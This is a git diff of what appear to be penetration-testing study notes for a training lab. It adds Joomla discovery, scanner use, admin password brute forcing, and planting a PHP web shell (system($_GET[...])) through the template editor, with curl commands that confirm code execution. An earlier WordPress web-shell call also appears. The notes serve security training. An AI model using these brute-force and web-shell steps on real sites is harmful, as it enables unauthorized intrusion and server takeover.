@@ -112,7 +112,6 @@ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB\
 
 ### Attacking Wordpress
 
-
 #### Login bruteforce
 
 - [```/xmlrpc.php```](https://kinsta.com/blog/xmlrpc-php/)
@@ -176,3 +175,82 @@ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
 curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
 ```
 
+## Joomla
+
+### Discovery
+
+- Grep the page:
+```bash
+curl -s http://dev.inlanefreight.local/ | grep Joomla
+```
+- Will possibly be indicated in the ```robots.txt```
+- Could be seen in the readme.txt:
+```bash
+curl -s http://dev.inlanefreight.local/README.txt | head -n 5
+```
+- Joomla sites sometimes have a telltale favicon
+- Possibly find the version in use
+```bash
+curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
+```
+- May also find the version number in ```media/system/js/``` or ```administrator/manifests/files/joomla.xml``` (approximate)
+
+### Enumeration
+
+#### Droopscan
+
+- Works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
+```bash
+sudo pip3 install droopescan
+droopescan -h
+droopescan scan joomla --url http://dev.inlanefreight.local/
+```
+
+#### [JoomlaScan](https://github.com/drego85/JoomlaScan)
+
+- Out of date and requires python 2.7
+- Not as valuable as droopescan, can help us find accessible directories and files and may help with fingerprinting installed extensions
+```bash
+curl https://pyenv.run | bash
+echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
+echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
+echo 'eval "$(pyenv init -)"' >> ~/.bashrc
+source ~/.bashrc
+pyenv install 2.7
+pyenv shell 2.7
+python2.7 -m pip install urllib3
+python2.7 -m pip install certifi
+python2.7 -m pip install bs
+python2.7 joomlascan.py -u http://dev.inlanefreight.local
+```
+
+#### Bruteforcing weak admin password
+
+- ```admin``` is the default admin account, password is set at install
+- Attempt brute force with [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce) script 
+```bash
+wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/refs/heads/master/joomla-brute.py
+sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
+
+### Attacking Joomla
+
+- Search the version online for known vulnerabilities
+
+#### Abusing Built-In Functionality
+
+- Once valid admin credentials obtained, log in to admin dashboard at ```/administrator```
+**TIP:** If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin.
+- Click on templates under configuration (bottom left)
+- Click on a template name under the Templates column header
+- Choose a none standard page, ```error.php``` for example.
+- Add the web shell after initial comments
+```php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); # randomness added to prevent drive by attack whilst performing pentest
+```
+- Click ```Save & Close```
+- Confirm code execution
+```bash
+curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+```
+- Remember to remove webshell after recording the vulnerability
